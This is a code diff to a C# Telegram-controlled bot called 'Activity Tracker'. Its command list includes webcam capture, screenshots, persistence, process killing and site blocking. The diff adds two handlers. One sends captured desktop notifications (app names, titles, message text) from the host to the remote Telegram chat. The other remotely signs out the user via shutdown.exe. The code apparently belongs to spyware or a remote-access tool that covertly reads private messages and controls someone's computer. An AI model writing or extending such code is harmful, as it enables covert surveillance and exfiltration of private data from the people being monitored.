@@ -327,6 +327,16 @@ namespace Activity_Tracker
                     await HandleProcessesCommandAsync(chatId, cancellationToken);
                     break;
 
+                case "/notifications":
+                case "/notifs":
+                    await HandleNotificationsCommandAsync(chatId, cancellationToken);
+                    break;
+
+                case "/signout":
+                case "/logoff":
+                    await HandleSignoutCommandAsync(chatId, cancellationToken);
+                    break;
+
 
                 case "/shutdown":
                 case "/exit":
@@ -356,8 +366,8 @@ namespace Activity_Tracker
                 I'm <b>Activity Tracker Bot</b> 🕵️‍♂️
 
                 <b>Control:</b> /track /stop /status /whoami /current /persistence
-                <b>Data:</b> /stats /history /pending /clear
-                <b>Utility:</b> /screenshot /webcam /sysinfo /users /processes /lock /sleep
+                <b>Data:</b> /stats /history /pending /notifications /clear
+                <b>Utility:</b> /screenshot /webcam /sysinfo /users /processes /lock /sleep /signout
                 <b>Advanced:</b> /msg /open /kill /block /unblock /shutdown
 
                 Send <code>/menu</code> for the button control panel.
@@ -562,6 +572,79 @@ namespace Activity_Tracker
             {
                 _logger.LogError(ex, "❌ Error getting pending reports");
                 await SendMessageAsync("❌ Error retrieving pending reports.", chatId, cancellationToken);
+            }
+        }
+
+        /// <summary>
+        /// Handles /notifications command - shows recent captured notifications
+        /// </summary>
+        public async Task HandleNotificationsCommandAsync(string chatId, CancellationToken cancellationToken)
+        {
+            try
+            {
+                var list = _storageService.LoadNotifications();
+                if (!list.Any())
+                {
+                    await SendMessageAsync("🔔 *No captured notifications!*", chatId, cancellationToken);
+                    return;
+                }
+
+                var sb = new StringBuilder();
+                sb.AppendLine("🔔 <b>Recent Captured Notifications:</b>");
+                sb.AppendLine();
+
+                foreach (var notif in list.Take(10)) // Show top 10
+                {
+                    string time = notif.Timestamp.ToString("HH:mm");
+                    string app = TelegramUiMenus.EscapeHtml(notif.AppName);
+                    string title = TelegramUiMenus.EscapeHtml(notif.Title);
+                    string message = TelegramUiMenus.EscapeHtml(notif.Message);
+
+                    sb.AppendLine($"• <b>[{app}]</b> at <code>{time}</code>");
+                    if (!string.IsNullOrEmpty(title))
+                    {
+                        sb.AppendLine($"  <b>{title}</b>");
+                    }
+                    if (!string.IsNullOrEmpty(message))
+                    {
+                        sb.AppendLine($"  {message}");
+                    }
+                    sb.AppendLine();
+                }
+
+                await SendHtmlMessageAsync(sb.ToString(), chatId, cancellationToken);
+            }
+            catch (Exception ex)
+            {
+                _logger.LogError(ex, "❌ Error handling /notifications command");
+                await SendMessageAsync("❌ Error retrieving notifications.", chatId, cancellationToken);
+            }
+        }
+
+        /// <summary>
+        /// Handles /signout command - signs out the active user session
+        /// </summary>
+        public async Task HandleSignoutCommandAsync(string chatId, CancellationToken cancellationToken)
+        {
+            try
+            {
+                await SendMessageAsync("🚶 *Signing out active user session...*", chatId, cancellationToken);
+                // Delay to give the message time to send
+                await Task.Delay(1500, cancellationToken);
+                
+                // Run signout command
+                System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo
+                {
+                    FileName = "shutdown.exe",
+                    Arguments = "/l",
+                    CreateNoWindow = true,
+                    UseShellExecute = false
+                });
+            }
+            catch (Exception ex)
+            {
+                _logger.LogError(ex, "❌ Error handling signout command");
+                await SendMessageAsync("❌ Failed to execute signout command.", chatId, cancellationToken);
             }
         }
 
@@ -1268,6 +1351,8 @@ namespace Activity_Tracker
                     new BotCommand { Command = "stop", Description = "Stop monitoring" },
                     new BotCommand { Command = "status", Description = "Tracking status" },
                     new BotCommand { Command = "screenshot", Description = "Capture desktop" },
+                    new BotCommand { Command = "notifications", Description = "Recent notifications" },
+                    new BotCommand { Command = "signout", Description = "Sign out active user session" },
                     new BotCommand { Command = "stats", Description = "Activity statistics" },
                     new BotCommand { Command = "help", Description = "Command reference" },
                 };
